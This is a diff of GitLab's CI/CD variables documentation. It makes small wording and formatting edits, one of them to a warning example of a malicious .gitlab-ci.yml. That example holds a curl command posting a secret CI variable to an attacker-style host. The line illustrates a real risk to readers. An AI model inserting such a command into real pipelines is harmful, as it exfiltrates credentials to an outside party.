@@ -142,7 +142,7 @@ Here is a simplified example of a malicious `.gitlab-ci.yml`:
 ```yaml
 build:
   script:
-    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
 ### Custom environment variables of type Variable
@@ -442,7 +442,7 @@ You can define instance-level variables via the UI or [API](../../api/instance_l
 
 To add an instance-level variable:
 
-1. Navigate to your admin area's **Settings > CI/CD** and expand the **Variables** section.
+1. Navigate to your Admin Area's **Settings > CI/CD** and expand the **Variables** section.
 1. Click the **Add variable** button, and fill in the details:
 
    - **Key**: Must be one line, using only letters, numbers, or `_` (underscore), with no spaces.
